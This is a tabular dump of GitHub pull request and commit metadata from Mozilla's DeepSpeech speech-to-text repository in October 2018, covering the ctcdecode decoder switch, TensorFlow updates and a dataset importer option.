1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13,Change Alphabet class to match ctcdecode needs
2769,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,770d742cd573b79d048ed5330bf4988c6cd9f4f7,"Adjust ctcdecode to use our Alphabet code, support using trie files"
2770,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cc9b3711dc0da2b650325b582cd88ebc8828c88,Use ctcdecode in native client
2771,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b29d0abb1e66de1445f136af7ee304a4ee01456a,"Make trie parameter optional, building it on demand if not passed"
2772,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,200e61e5a84de4793f0ecb2c539f402683ac28d6,Add libdl and pthread to linkopts
2773,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,70ff71c4c503e17b3777124d62bb4f9af3aab831,Switch native tests to ctcdecode trie and prodmodel
2774,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,58b25da29b5a968f0bdc2681dda2f20684a3c6ca,Fix libstdc++ versioning error on ARM
2775,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf57453beb84f9e9d29155927bf3c3120b996c28,Fix signature of ctc_beam_search_decoder_batch
2776,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db3a36c36bdc0aaa2b7279bb27b0a85bc5cba98a,Remove leftover hack making Scorer members public
2777,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa6434b27d47ded32748bbc0d892ff410a3ae60b,"Revert ""Make trie parameter optional, building it on demand if not passed""

This reverts commit b29d0abb1e66de1445f136af7ee304a4ee01456a."
2778,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,68258e356c43bf83afa9f4604ecd7487f4ac743a,Address review comments
2779,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1679,1679,Use ctcdecode in native client (Fixes #1668),"This PR switches the native client code (and clients that use it) to use ctcdecode instead of the TensorFlow decoder. It does not change any of the training code, nor does it remove the TensorFlow decoder. That will be done as part of #1675. With this PR, there's a disconnect between training code and clients, and DeepSpeech.py WER reports for example won't match the results of our clients. On the other hand, it does let us get the benefits of ctcdecode out to users more quickly.

I recommend reviewing commit by commit. They all build on top of each other and the code builds and works at any given commit in this branch. Here's a breakdown:

1. c34fc5b7ac9fdeae656f7098947b25c8264fa647 - Just imports the code and adds a README.mozilla pointing to the version imported
1. 0002d0feedbe003cf8c799719a44bd73857cb831 - Adds the new code to the BUILD file and also cleans it up a bit
1. e72f07962ab25e0ba0761a2cfe5fc13fdf6e6d13 - Makes a few modifications to the Alphabet class needed for using it in ctcdecode
1. 770d742cd573b79d048ed5330bf4988c6cd9f4f7 - Modifies ctcdecode to use our Alphabet class, and adds support for saving and loading the trie to/from disk
1. 3cc9b3711dc0da2b650325b582cd88ebc8828c88 - Switches the native client to use ctcdecode. Also adapts generate_trie.cpp and trie_load.cc to work with the new setup.
1. b29d0abb1e66de1445f136af7ee304a4ee01456a - The new decoder can build the trie from the language model, so make the trie flag optional in clients.

I'm not asking for review yet because I want to see how this does on the tests.",reuben,477142,2018-10-24T22:34:29Z,MEMBER,True,198265,174,514,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23497fde41e6e76d4a452fd9ebcfae8b31b3d5ad,Use unique_ptr for Scorer members
2780,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1677,1677,R1.11 brew,,lissyx,1645737,2018-10-24T15:09:19Z,COLLABORATOR,True,50,27,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4be9364c364ce6bbe83847530da4d2e0265d88a1,Force HOMEBREW_NO_AUTO_UPDATE=1 to avoid magic autoupdate of brew
2781,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1677,1677,R1.11 brew,,lissyx,1645737,2018-10-24T15:09:19Z,COLLABORATOR,True,50,27,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae5303e130acaa41e4ee81b17a197e6a119110bb,Update TensorFlow r1.11
2782,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1677,1677,R1.11 brew,,lissyx,1645737,2018-10-24T15:09:19Z,COLLABORATOR,True,50,27,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc9b6e3c2cd12e85273c1a529b89a8d94367c6bb,Export trained model before testing with checkpoint
2783,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1667,1667,Bump v0.3.0,,lissyx,1645737,2018-10-23T11:02:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46b327a3d9a5ab57ddbe74d81eefe989bf6c6014,Bump VERSION to v0.3.0
2784,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1663,1663,Fix import_cv.py,I have no idea how this ever worked.,faissaloo,8840681,2018-10-19T22:23:25Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,529ebdfcb4507c7ced8f42b2d386b8a780a39551,"Fix import_cv.py

I have no idea how this ever worked"
2785,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1662,1662, Fixing broken link to 0.3.0 pre-trained models ,"The pre-trained models for 0.3.0 haven't been released yet, so people doing the quickstart encounter 404.
This change reverts the link back to 0.2.0 for now.",bfinan,10965554,2018-10-19T20:35:08Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2cc92ea0d586295b67a41ea21827093a7ac875e,"Fixing broken link to 0.3.0 pre-trained models

The pre-trained models for 0.3.0 haven't been released yet, so people doing the quickstart encounter 404.
This change reverts the link back to 0.2.0 for now."
2786,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1662,1662, Fixing broken link to 0.3.0 pre-trained models ,"The pre-trained models for 0.3.0 haven't been released yet, so people doing the quickstart encounter 404.
This change reverts the link back to 0.2.0 for now.",bfinan,10965554,2018-10-19T20:35:08Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,867740ea828d7907e1859b853da7ab69d534c865,"Merge pull request #1 from bfinan/bfinan-patch-1

Fixing broken link to 0.3.0 pre-trained models"
2787,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1661,1661,Remove initialize_from_frozen_model flag and support code (Fixes #1659),,reuben,477142,2018-10-19T17:47:23Z,MEMBER,True,43,84,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46d1cece4f98d726d88579500734a95686cfe16b,Remove initialize_from_frozen_model flag and support code
2788,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1652,1652,Tf master stable tc workdir,,lissyx,1645737,2018-10-16T07:43:22Z,COLLABORATOR,True,45,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,634ac71b2a077e6cc33500684edcfe16d5dd1c2d,Avoid task_TIMESTAMP use on macOS generic-worker
2789,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1652,1652,Tf master stable tc workdir,,lissyx,1645737,2018-10-16T07:43:22Z,COLLABORATOR,True,45,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0dc23468c2970dea8f4a4674ed2941252482eaf,Update TensorFlow master
2790,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1651,1651,Stable tc workdir,,lissyx,1645737,2018-10-15T17:23:36Z,COLLABORATOR,True,45,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32a75d1d9d81abc3e23d51a7a0cd658e324d21c4,Avoid task_TIMESTAMP use on macOS generic-worker
2791,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1651,1651,Stable tc workdir,,lissyx,1645737,2018-10-15T17:23:36Z,COLLABORATOR,True,45,65,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6f9a60967b2586eedfbc9d962496084c7b65050,Update TensorFlow r1.11
2792,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1650,1650,Fixed #1649 (Update README's for 0.3.0),,kdavis-mozilla,12054740,2018-10-15T14:53:38Z,CONTRIBUTOR,True,4,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,111262a3ec3c1fe1ebe0b8d414cede81e6f23864,Fixed #1649 (Update README's for 0.3.0)
2793,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1647,1647,[TrainingSpeech importer] generate english-complatible dataset,"Aims to generate english-complatible dataset since no FR alphabet.txt available right now.
See https://github.com/mozilla/DeepSpeech/pull/1599#issuecomment-426544379 for more info

usage:
```shell
$ ./bin/import_ts.py  --help
usage: import_ts.py [-h] [--english-compatible] target_dir

Importer for TrainingSpeech dataset.

positional arguments:
  target_dir

optional arguments:
  -h, --help            show this help message and exit
  --english-compatible  Remove diactrics and other non-ascii chars.
```

remaining chars:
```shell
$ tail -n +2 -q  /tmp/ts_*.csv | gawk -F "","" '{print $3}' | tr '\n' ' ' | awk -F """" '{for (i=1; i<=NF; i++) print $i}' | sort | uniq |sort
 
'
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
```",nicolaspanel,2500584,2018-10-14T11:49:54Z,CONTRIBUTOR,True,20,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,609120f3da80d9622fc14803b05faf4bf476013a,"[TrainingSpeech importer] stick to data/alphabet.txt

aims to generate english-complatible dataset since no FR alphabet.txt for now
see https://github.com/mozilla/DeepSpeech/pull/1599#issuecomment-426544379 for more info"
2794,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1647,1647,[TrainingSpeech importer] generate english-complatible dataset,"Aims to generate english-complatible dataset since no FR alphabet.txt available right now.
See https://github.com/mozilla/DeepSpeech/pull/1599#issuecomment-426544379 for more info

usage:
```shell
$ ./bin/import_ts.py  --help
usage: import_ts.py [-h] [--english-compatible] target_dir

Importer for TrainingSpeech dataset.

positional arguments:
  target_dir

optional arguments:
  -h, --help            show this help message and exit
  --english-compatible  Remove diactrics and other non-ascii chars.
```

remaining chars:
```shell
$ tail -n +2 -q  /tmp/ts_*.csv | gawk -F "","" '{print $3}' | tr '\n' ' ' | awk -F """" '{for (i=1; i<=NF; i++) print $i}' | sort | uniq |sort
 
'
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
```",nicolaspanel,2500584,2018-10-14T11:49:54Z,CONTRIBUTOR,True,20,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,285efcf23154cd043da6dd8ce63893544edbfb89,Merge branch 'master' of github.com:nicolaspanel/DeepSpeech
2795,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1647,1647,[TrainingSpeech importer] generate english-complatible dataset,"Aims to generate english-complatible dataset since no FR alphabet.txt available right now.
See https://github.com/mozilla/DeepSpeech/pull/1599#issuecomment-426544379 for more info

usage:
```shell
$ ./bin/import_ts.py  --help
usage: import_ts.py [-h] [--english-compatible] target_dir

Importer for TrainingSpeech dataset.

positional arguments:
  target_dir

optional arguments:
  -h, --help            show this help message and exit
  --english-compatible  Remove diactrics and other non-ascii chars.
```

remaining chars:
```shell
$ tail -n +2 -q  /tmp/ts_*.csv | gawk -F "","" '{print $3}' | tr '\n' ' ' | awk -F """" '{for (i=1; i<=NF; i++) print $i}' | sort | uniq |sort
 
'
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
```",nicolaspanel,2500584,2018-10-14T11:49:54Z,CONTRIBUTOR,True,20,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61d9193ce52503b52954736d1e60761c32d0b339,[TrainingSpeech importer] add `--english-compatible` option
2796,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1646,1646,Bump to v0.3.0-alpha.1,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-10-13T09:11:26Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fbf61cd6c7e0cbdb1c49b3794298e5477794b92,"Bump to v0.3.0-alpha.1

X-DeepSpeech: NOBUILD"
2797,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1644,1644,Remove useless bogus cURL call,,lissyx,1645737,2018-10-12T12:05:53Z,COLLABORATOR,True,1,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed489b1112d093d2aed2b696c522d85cc64a46f2,Remove useless bogus cURL call
2798,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1642,1642,Fix evaluate.py to handle compact format in cached features,,reuben,477142,2018-10-11T19:02:08Z,MEMBER,True,23,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e00c63c0a8028d32bae30e68bc461478f486e535,Fix evaluate.py to handle compact format in cached features
